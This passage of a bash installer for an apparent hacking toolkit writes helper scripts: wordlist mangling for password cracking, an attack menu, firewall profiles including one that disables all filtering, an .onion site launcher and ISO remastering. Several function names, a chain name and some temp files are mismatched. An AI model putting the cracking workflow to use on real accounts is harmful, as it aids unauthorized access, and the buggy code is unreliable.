		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_spaces_null () { # Spaces To Null

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -e 's/ //g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_spaces_dash () { # Spaces To Dash

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -e 's/ /-/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_spaces_underscore () { # Spaces To Underscore

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -e 's/ /_/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_spaces_return () { # Spaces To Return

		f_art
		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | tr ' ' '\012' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_add_begin () { # Add A word at the beginning of every line

		f_art
		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		echo -n £+Write the word that you want to add : £+
		read wordadd

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -e 's/^/'harrypotterwordadd'/' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_add_end () { # Add A word at the end of every line

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		echo -n £+Write the word that you want to add : £+
		read wordadd

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | sed -e 's/harrypotter/'harrypotterwordadd'/' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_num_begin () { # Numerise Beginning

		f_art
		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		echo -n £+Insert The first Number of the sequence : £+
		read firstnum

		echo -n £+Insert The last Number of the sequence : £+
		read lastnum

		echo £+Insert the value of the difference beetwen the first and £+
		echo -n £+ the second number : £+
		read pass

		echo -n £+Select the tmp dir (es: /tmp) : £+
		read tmp

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		until [ harrypotterfirstnum -gt harrypotterlastnum ]; do

			echo harrypotterfirstnum

			cat harrypotterfile | sed -e 's/^/'harrypotterfirstnum'/' >> harrypottertmp/harrypotterfirstnum.tmp

			firstnum=harrypotter[ harrypotterfirstnum + harrypotterpass ]

		done

		cat harrypottertmp/harrypotteroutname.tmp | sort -u >> harrypotterout/harrypotteroutname

		( rm -f harrypottertmp/harrypotteroutname.tmp ) &

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		clear

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_num_end () { # Numerise End

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		echo -n £+Insert The first Number of the sequence : £+
		read firstnum

		echo -n £+Insert The last Number of the sequence : £+
		read lastnum

		echo £+Insert the value of the difference beetwen the first and £+
		echo -n £+ the second number : £+
		read pass

		echo -n £+Select the tmp dir (es: /tmp) : £+
		read tmp

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		until [ harrypotterfirstnum -gt harrypotterlastnum ]; do

			echo harrypotterfirstnum

			cat harrypotterfile | sed -e 's/harrypotter/'harrypotterfirstnum'/' >> harrypottertmp/harrypotteroutname.tmp

			firstnum=harrypotter[ harrypotterfirstnum + harrypotterpass ]

		done

		cat harrypottertmp/harrypotteroutname.tmp | sort -u >> harrypotterout/harrypotteroutname

		( rm -f harrypottertmp/harrypotteroutname.tmp ) &

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		clear

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_all () { # All

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		echo -n £+Select the tmp dir (es: /tmp) : £+
		read tmp

		f_art

		echo -n £+[*] Lowerising Wordlist ... £+
		timelapsed &
		cat harrypotterfile | tr '[:upper:]' '[:lower:]' | sed -e 's/ *harrypotter//' >> harrypottertmp/lower.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Capitalising Wordlist ... £+
		timelapsed &
		cat harrypotterfile | tr '[:lower:]' '[:upper:]' | sed -e 's/ *harrypotter//' >> harrypottertmp/capitalised.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Capitalising The First Letter ... £+
		timelapsed &
		cat harrypotterfile | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *harrypotter//' >> harrypottertmp/firscapitalised.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Merging the Wordlists ... £+
		timelapsed &
		cat harrypottertmp/lower.txt harrypottertmp/capitalised.txt harrypottertmp/firscapitalised.txt | sort -u >> harrypottertmp/wordlistedit1.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Spaces To Null ... £+
		timelapsed &
		cat harrypottertmp/wordlistedit1.txt | sed -e 's/ //g'>> harrypottertmp/wordlistedit2.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Spaces to Dash (-) ... £+
		timelapsed &
		cat harrypottertmp/wordlistedit1.txt | sed -e 's/ /-/g' >> harrypottertmp/wordlistedit3.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Spaces to Underscore (_)... £+
		timelapsed &
		cat harrypottertmp/wordlistedit1.txt | sed -e 's/ /_/g' >> harrypottertmp/wordlistedit4.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Spaces to Return ... £+
		timelapsed &
		cat harrypottertmp/wordlistedit1.txt | tr ' ' '\012' >> harrypottertmp/wordlistedit5.txt
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo -n £+[*] Creating harrypotteroutname ... £+
		timelapsed &
		cat harrypottertmp/wordlistedit1.txt harrypottertmp/wordlistedit2.txt harrypottertmp/wordlistedit3.txt harrypottertmp/wordlistedit4.txt harrypottertmp/wordlistedit5.txt | sort -u >> harrypotterout/harrypotteroutname
		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+[*] Deleting tmp files ... £+
		rm -f harrypottertmp/lower.txt
		rm -f harrypottertmp/capitalised.txt
		rm -f harrypottertmp/firstcapitalised.txt
		rm -f harrypottertmp/wordlistedit1.txt
		rm -f harrypottertmp/wordlistedit2.txt
		rm -f harrypottertmp/wordlistedit3.txt
		rm -f harrypottertmp/wordlistedit4.txt
		rm -f harrypottertmp/wordlistedit5.txt

		clear

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}


	choice=0
	low=1
	cap=2
	capfirst=3
	spacenull=4
	spacedash=5
	spaceunderscore=6
	spacereturn=7
	wordbegin=8
	wordend=9
	numbegin=10
	numend=11
	all=12
	until [ harrypotterchoice == harrypotterlow ] || [ harrypotterchoice == harrypottercap ] || [ harrypotterchoice == harrypottercapfirst ] || [ harrypotterchoice == harrypotterspacenull ] || [ harrypotterchoice == harrypotterspacedash ] || [ harrypotterchoice == harrypotterspaceunderscore ] || [ harrypotterchoice == harrypotterspacereturn ] || [ harrypotterchoice == harrypotterwordbegin ] || [ harrypotterchoice == harrypotterwordend ] || [ harrypotterchoice == harrypotternumbegin ] || [ harrypotterchoice == harrypotternumend ] || [ harrypotterchoice == harrypotterall ]; do
		f_art
		echo £+Select an Options :£+
		echo £+£+
		echo £+1) All letters to lower£+
		echo £+2) All letter to Capital£+
		echo £+3) First letter to Capital£+
		echo £+4) Nullify Spaces£+
		echo £+5) Spaces to Dash (-)£+
		echo £+6) Spaces to Underscore (_)£+
		echo £+7) Spaces to Return£+
		echo £+8) Add a word of your choosing at the beginning of every line£+
		echo £+9) Add a word of your choosing at the end of every line£+
		echo £+10) Numerise the beginning of every line£+
		echo £+11) Numerise the end of every line£+
		echo £+12) All: Take a wordlist, capitalise and lowerise it, sort and transform£+
        echo £+         spaces to null, dash, underscore and return, and merge it all£+
		echo £+£+
		echo -en £+Selection : £+
		read choice
	done


	case harrypotterchoice in

	1) f_low ;;

	2) f_capitalised ;;

	3) f_cap_first ;;

	4) f_spaces_null ;;

	5) f_space_dash ;;

	6) f_spacess_underscore ;;

	7) f_spaces_return ;;

	8) f_add_begin ;;

	9) f_add_end ;;

	10) f_num_begin ;;

	11) f_num_end ;;

	12)	f_all ;;

	esac

}


##################################################################################

# Menu Function

##################################################################################

f_art () {

clear

echo £+

 ####### ####### #     # ######  ### ######
 #       #       ##    # #     #  #  #     #
 #       #       # #   # #     #  #  #     #
 #####   #####   #  #  # ######   #  ######
 #       #       #   # # #   #    #  #   #
 #       #       #    ## #    #   #  #    #
 #       ####### #     # #     # ### #     #

#############################################

 £+

}

f_menu () {

hackcho=0
wireless=1
lanattack=2
webattack=3
passwordcracking=4
wordlist=5
exitnow=6
until [ harrypotterhackcho == harrypotterwireless ] || [ harrypotterhackcho == harrypotterlanattack ] || [ harrypotterhackcho == harrypotterwebattack ] || [ harrypotterhackcho == harrypotterpasswordcracking ] || [ harrypotterhackcho == harrypotterwordlist ] || [ harrypotterhackcho == harrypotterexitnow ]; do
	f_art
	echo £+1) Wireless Cracking/Sniffing£+
	echo £+2) Lan Pentesting£+
	echo £+3) Exploit an online PC or WebServer£+
	echo £+4) Password Cracking£+
	echo £+5) Wordlist Editing£+
	echo £+6) Exit£+
	echo £+£+
	echo -n £+Choice  : £+
	read hackcho
done

case harrypotterhackcho in

1) f_wireless ;;

2) f_lanattack ;;

3) f_webattack ;;

4) f_passwordcracking ;;

5) f_wordlist_editing ;;

6) exit 0 ;;

esac

}

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

f_menu

" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> fenrir.sh

}

f_writing_fenrir

ln -sf /opt/darkeffe/fenrir.sh /usr/local/bin/fenrir 1> /dev/null

cd $home

}

f_fenrir

f_firewall () {

echo "  [*] Firewall"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f firewallclient.sh 1> /dev/null
touch firewallclient.sh 1> /dev/null

f_writing_firewallclient () {

echo "#!/bin/bash

# File di configurazione IPtables

#===================ROOT===================#

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

#===================DELETE FIREWALL RULES===================#

iptables -F
iptables -F -t nat
iptables -F -t mangle
iptables -X
iptables -X -t nat
iptables -X -t mangle

#===================DROP INPUT===================#

iptables -P INPUT DROP

#===================DROP OUTPUT===================#

iptables -P OUTPUT ACCEPT

#==================ACCEPT INPUT e OUTPUT loopback===================#

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#===================DROP FORWARD===================#

iptables -P FORWARD DROP

#===================ACCEPT REQUESTED INPUT===================#

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

#===================Http===================#

# Porta 80 webserver (http)
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Porta 443 webserver secure (https)
iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT

#===================LOCAL===================#

# Porte Samba 137 138 139 445
iptables -A INPUT -p udp -m udp --dport 137 -j ACCEPT
iptables -A INPUT -p udp -m udp --dport 138 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT

#===================SHARING===================#

# Porte Amule 4662 4665 4672
iptables -A INPUT -p tcp --dport 4662 -j ACCEPT
iptables -A INPUT -p udp --dport 4665 -j ACCEPT
iptables -A INPUT -p udp --dport 4672 -j ACCEPT

# Porta Frostwire 14439
iptables -A INPUT -p tcp --dport 14439 -j ACCEPT

#===================Chat===================#

# Porte amsn 1863 6891 6892
iptables -A INPUT -p udp -m udp --dport 1863 -j ACCEPT
iptables -A INPUT -p tcp --dport 6891 -j ACCEPT
iptables -A INPUT -p tcp --dport 6892 -j ACCEPT

#===================Remote Connection===================#

# Porte Vinagre 5900
iptables -A INPUT -p tcp -m tcp --dport 5900 -j ACCEPT

#===================PROXY===================#

# Porta 8118 Tor
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
iptables -A INPUT -p tcp --dport 8118 -j ACCEPT

# Porta 9050 Socks
iptables -A INPUT -p tcp --dport 9050 -j ACCEPT


# http://www.pcflank.com/
# https://www.grc.com/x/ne.dll?bh0bkyd2

" | sed -e 's/harrypotter/$/g'  | sed -e 's/£+/"/g' >> firewallclient.sh

}

f_writing_firewallclient

ln -sf /opt/darkeffe/firewallclient.sh /usr/local/bin/firewallclient 1> /dev/null

rm -f firewallserver.sh 1> /dev/null
touch firewallserver.sh 1> /dev/null

f_writing_firewallserver () {

echo "#!/bin/bash

# File di configurazione IPtables

#===================ROOT===================#

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

#===================DELETE FIREWALL RULES===================#

iptables -F
iptables -F -t nat
iptables -F -t mangle
iptables -X
iptables -X -t nat
iptables -X -t mangle

#===================DROP INPUT===================#

iptables -P INPUT DROP

#===================DROP OUTPUT===================#

iptables -P OUTPUT ACCEPT

#==================ACCEPT INPUT e OUTPUT loopback===================#

iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#===================DROP FORWARD===================#

iptables -P FORWARD DROP

#===================ACCEPT REQUESTED INPUT===================#

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

#===================Http===================#

iptables -A INPUT -p tcp --dport 80 -j ACCEPT # HTTP
iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT # HTTPS

#===================MAIL===================#

iptables -A INPUT -p tcp --dport 25 -j ACCEPT # SMTP
iptables -A INPUT -p tcp --dport 110 -j ACCEPT # POP3
iptables -A INPUT -p tcp --dport 465 -j ACCEPT # SMTP SSL
iptables -A INPUT -p tcp --dport 993 -j ACCEPT # IMAP4 SSL
iptables -A INPUT -p tcp --dport 995 -j ACCEPT # POP3 SSL

#===================STMP===================#

iptables -A INPUT -p udp -m udp --dport 137 -j ACCEPT
iptables -A INPUT -p udp -m udp --dport 138 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 139 -j ACCEPT
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 445 -j ACCEPT

#===================FTP===================#

iptables -A INPUT -p tcp --dport 21 -j ACCEPT # FTP
iptables -A INPUT -p tcp --dport 990 -j ACCEPT # FTPS

#===================SSH===================#

iptables -N SSHBRUTEDEF
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j SSHBRUTEDEF
iptables -A SSHBRUTEDEF -m recent --set --name SSH
iptables -A SSHBRUTEDEFN -m recent --update --seconds 60 --hitcount 5 --name SSH -j LOG --log-level info --log-prefix ""SSH BRUTE ATTACK blocked: ""
iptables -A SSHBRUTEDEF -m recent --update --seconds 60 --hitcount 5 --name SSH -j DROP

#===================VNC===================#

iptables -A INPUT -p tcp -m tcp --dport 1080 -j ACCEPT

#===================CUPS===================#

iptables -A INPUT -p udp --dport 631 -j ACCEPT # CUPS


# http://www.pcflank.com/
# https://www.grc.com/x/ne.dll?bh0bkyd2

" | sed -e 's/harrypotter/$/g'  | sed -e 's/£+/"/g' >> firewallserver.sh

}

f_writing_firewallserver

ln -sf /opt/darkeffe/firewallserver.sh /usr/local/bin/firewallserver 1> /dev/null

rm -f delfirewall.sh 1> /dev/null
touch delfirewall.sh 1> /dev/null

f_writing_delfirewall () {

echo "#!/bin/bash

# File di configurazione IPtables

#===================ROOT===================#

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

#===================DELETE FIREWALL RULES===================#

iptables -F
iptables -F -t nat
iptables -F -t mangle
iptables -X
iptables -X -t nat
iptables -X -t mangle

#===================INPUT ACCEPT===================#

iptables -P INPUT ACCEPT

#===================OUTPUT ACCEPT===================#

iptables -P OUTPUT ACCEPT

#===================FORWARD ACCEPT===================#

iptables -P FORWARD ACCEPT

" | sed -e 's/harrypotter/$/g'  | sed -e 's/£+/"/g' >> delfirewall.sh

}

f_writing_delfirewall

ln -sf /opt/darkeffe/delfirewall.sh /usr/local/bin/delfirewall 1> /dev/null

cd $home

}

f_firewall

f_hiddenservices () {

echo "  [*] HiddenServices"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f hiddenservices.sh 1> /dev/null
touch hiddenservices.sh 1> /dev/null

f_writing_hiddenservices () {

echo "#!/bin/bash

f_menu () {

url_hiddenwiki=£+http://kpvz7ki2v5agwt35.onion/wiki/index.php/Main_Page£+
url_alexandr=£+http://xqz3u5drneuzhaeo.onion/users/iskanderarchiv/Wikkawikkki/wikka.php?wakka=HomePage£+
url_downloadebooks=£+http://wiki.mobileread.com/wiki/Free_eBooks£+
url_stealthiswiki=£+http://wiki.stealthiswiki.org/wiki/Main_Page£+
url_hackingforum=£+http://clsvtzwzdgzkjda7.onion/£+
url_tormail=£+http://jhiwjjlqpyawmpjx.onion/£+
url_superduckduck=£+http://3g2upl4pq6kufc4m.onion/£+

clear

deepcho=190
hiddenwiki=1
alexandr=2
hackingforum=3
hiddenmail=4
superduckduck=5

until [ harrypotterdeepcho == harrypotterhiddenwiki ] || [ harrypotterdeepcho == harrypotteralexandr ] || [ harrypotterdeepcho == harrypotterhackingforum ] || [ harrypotterdeepcho == harrypotterhiddenmail ] || [ harrypotterdeepcho == harrypottersuperduckduck ]; do
	clear
	echo £+Select The Site Where You Wanna Go (Needs Firefox, Tor and TorButton) : £+
	echo £+£+
	echo £+1) The Hidden Wiki£+
	echo £+2) Bibliotheca Alexandrina£+
	echo £+3) Hacking Forum£+
	echo £+4) SthealThisWiki£+
	echo £+5) Tor Hidden Mail£+
	echo £+6) Search the Web with a filtred and anonymous duck duck go£+
	echo £+7) Exit£+
	echo £+£+
	echo -n £+Enter Choice : £+
	read deepcho
done

case deepcho in

1) firefox harrypotterurl_hiddenwiki ;;

2) firefox harrypotterurl_alexandr ;;

3) firefox harrypotterurl_hackingforum ;;

4) firefox harrypotterurl_stealthiswiki ;;

5) firefox harrypotterurl_tormail ;;

6) firefox harrypotterurl_superduckduck ;;

7) exit 0 ;;

esac

}

f_menu

exit 0
" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> hiddenservices.sh

}

f_writing_hiddenservices

cd $HOME 1> /dev/null

ln -fs /opt/darkeffe/hiddenservices.sh /usr/local/bin/hiddenservices 1> /dev/null

}

f_hiddenservices

f_isoedit () {

echo "  [*] IsoEdit "

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f isoedit.sh 1> /dev/null
touch isoedit.sh 1> /dev/null

f_writing_isoedit () {

echo "#!/bin/bash

timelapsed () {

	k=1
	until [ -e $HOME/pio.txt ]; do
		sleep 1
		if [ $k -lt 10 ]; then
			echo -en  £+[$k s]\b\b\b\b\b\c£+
		elif [ $k -ge 10 ]; then
			echo -en  £+[$k s]\b\b\b\b\b\b\c£+
		elif [ $k -ge 100 ]; then
			echo -en  £+[$k s]\b\b\b\b\b\b\b\c£+
		elif [ $k -ge 1000 ]; then
			echo -en  £+[$k s]\b\b\b\b\b\b\b\b\c£+
		elif [ $k -ge 10000 ]; then
			echo -en  £+[$k s]\b\b\b\b\b\b\b\b\b\c£+
		else [ $k -ge 100000 ]
			echo -en  £+[$k s]\b\b\b\b\b\b\b\b\b\b\c£+
		fi
		k=$[ $k + 1 ]
	done
	# use:
	# echo -n £+what i am doing £+
	# timelapsed &
	# touch $HOME/pio.txt
	# sleep 1
	# rm -f $HOME/pio.txt
	# echo £+£+

}

clear

echo -n £+Enter The Iso Path (es : /home/user/) : £+
read isopath

echo -n £+Enter The Iso Name (es: pask.iso) : £+
read isoname

echo -n £+Enter The Modified Iso Name (es edited.iso) : £+
read editedisoname

clear
echo £+[*] Installing Uck ...£+
apt-get install -y --force-yes uck 1> /dev/null 2> /dev/null

echo £+£+
echo -n £+[*] Scompatting harrypotterisoname ...£+
timelapsed &
uck-remaster-unpack-iso harrypotterisopath/harrypotterisoname 1> /dev/null 2> /dev/null

touch $HOME/pio.txt
sleep 1
rm -f $HOME/pio.txt
echo £+£+

echo £+Now You Will Enter The Chrooted Iso, when you finish enter : £+
echo £+update-initramfs -u£+
echo £+exit£+

sleep 10

uck-remaster-chroot-rootfs

clear

echo £+[*] Adjusting Files ...£+
rm -f ~/tmp/remaster-iso/casper/initrd.lz 1> /dev/null 2> /dev/null
cp ~/tmp/remaster-root/boot/initrd.img-* ~/tmp/remaster-iso/casper/initrd.gz 1> /dev/null 2> /dev/null
cp ~/tmp/remaster-root/boot/vmlinuz-* ~/tmp/remaster-iso/casper/vmlinuz 1> /dev/null 2> /dev/null
uck-remaster-pack-rootfs -c 1> /dev/null 2> /dev/null

echo £+£+
echo -n £+[*] Creating The Edited Iso Image ...£+
timelapsed &
uck-remaster-pack-iso harrypotterisopath/harrypottereditedisoname 1> /dev/null 2> /dev/null

touch $HOME/pio.txt
sleep 1
rm -f $HOME/pio.txt
echo £+£+

clear

echo £+Your Edited Iso Is In harrypotterisopath/harrypottereditedisoname £+

sleep 2

exit 0
" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> isoedit.sh

}

f_writing_isoedit

cd $HOME 1> /dev/null

ln -sf /opt/darkeffe/isoedit.sh /usr/local/bin/isoedit 1> /dev/null

}

f_isoedit

f_linuxversion () {

echo "  [*] LinuxVersion"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f linuxversion.sh 1> /dev/null
touch linuxversion.sh 1> /dev/null

f_writing_linuxversion () {

echo "#!/bin/bash

clear

a=harrypotter( cat /etc/issue | awk '{print harrypotter1}' | tr '[:upper:]' '[:lower:]' | sed -r 's/\b(.)/\U\1/g' )

b=harrypotter( cat /etc/issue | awk '{print harrypotter2}' )

echo £+You Have Installed harrypottera Linux harrypotterb£+

" | sed -e 's/harrypotter/$/g' |sed -e 's/£+/"/g' >> linuxversion.sh

}

f_writing_linuxversion

ln -sf /opt/darkeffe/linuxversion.sh /usr/local/bin/linuxversion 1> /dev/null

cd $HOME

}

f_linuxversion

f_meme () {

echo "  [*] LinuxVersion"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f meme.sh 1> /dev/null
touch meme.sh 1> /dev/null

f_writing_meme () {

echo "#!/bin/bash

forever_alone=£+[[227644903931785]]£+
trollface=£+[[171108522930776]]£+
me_gusta=£+[[164413893600463]]£+
yao_ming=£+[[218595638164996]]£+
are_you_serious=£+[[150789678325119]]£+
poker_face=£+[[129627277060203]]£+
forever_alone=£+[[227644903931785]]£+
forever_alone_christmas=£+[[125038607580286]]£+
okay=£+[[100002752520227]]£+
fuck_yeah=£+[[105387672833401]]£+
challenge_accepted=£+[[100002727365206]]£+
are_you_fucking_kidding_me=£+[[143220739082110]]£+
sir=£+[[168040846586189]]£+
not_bad=£+[[169919399735055]] or [[NotBaad]]£+
mother_of_god=£+[[142670085793927]]£+
cereal_guy=£+[[170815706323196]]£+
no=£+[[167359756658519]]£+
derp=£+[[224812970902314]]£+
derpina=£+[[192644604154319]]£+
lolface=£+[[168456309878025]]£+
badass=£+[[147534638688365]]£+
fuuuuu=£+[[FUUUOFFICIAL]]    or    [[145768898802324]]£+
nothing_to_do_here=£+[[214457085240151]]£+
y_u_no=£+[[106043532814443]]£+
all_the_things=£+[[243036739054185]]£+
fap=£+[[FapFapFapFap.B]]£+
schlick=£+[[133361803408320]]£+
chuck_norris=£+[[46637413257]]£+
" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> meme.sh

}

f_writing_meme

ln -sf /opt/darkeffe/meme.sh /usr/local/bin/meme 1> /dev/null

}

f_meme

f_myip () {

echo "  [*] MyIP"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f myip.sh 1> /dev/null
touch myip.sh 1> /dev/null

f_writing_myip () {

echo "#!/bin/bash

clear

localip=harrypotter( ifconfig | grep £+indirizzo inet:£+ | grep -v £+127.0.0.1£+ | sed -e 's/indirizzo inet://g' | awk '{printf harrypotter1}' )

externalip=harrypotter( wget -q -O - checkip.dyndns.org|sed -e 's/.*Current IP Address: //' -e 's/<.*harrypotter//' )

echo £+Local Ip :       harrypotterlocalip £+
echo £+External Ip :    harrypotterexternalip £+

exit 0

" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> myip.sh

}

f_writing_myip

cd $HOME

ln -sf /opt/darkeffe/myip.sh /usr/local/bin/myip 1> /dev/null

}

f_myip

f_ramdisk () {

echo "  [*] RamDisk"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f ramdisk.sh 1> /dev/null
touch ramdisk.sh 1> /dev/null

f_writing_ramdisk () {

echo "#!/bin/bash

URAND=/dev/urandom
RAMDISK=/mnt/.ramdisk
MAPPER=/dev/mapper

f_ramdisk_create () {

	clear

	echo -n £+Inserisci La Dimensione Del RamDisk (KB) : £+
	read SIZEKB

	echo -n £+Inserisci La Dimensione Del RamDisk (MB) : £+
	read SIZEMB

	echo -n £+Inserisci Il Nome Del RamDisk (es: CRYPTDISK) : £+
	read CRYPT

	echo £+£+

	echo £+[*] Dir Generation ... £+
	mkdir -p harrypotterRAMDISK
	mount -t ramfs none harrypotterRAMDISK -o maxsize=harrypotterSIZEKB # ramfs ---> don't swap on the hard drive
	chmod 777 harrypotterRAMDISK # permission to non root users to /read/write/execute

	echo £+[*] File Container Generation ... £+
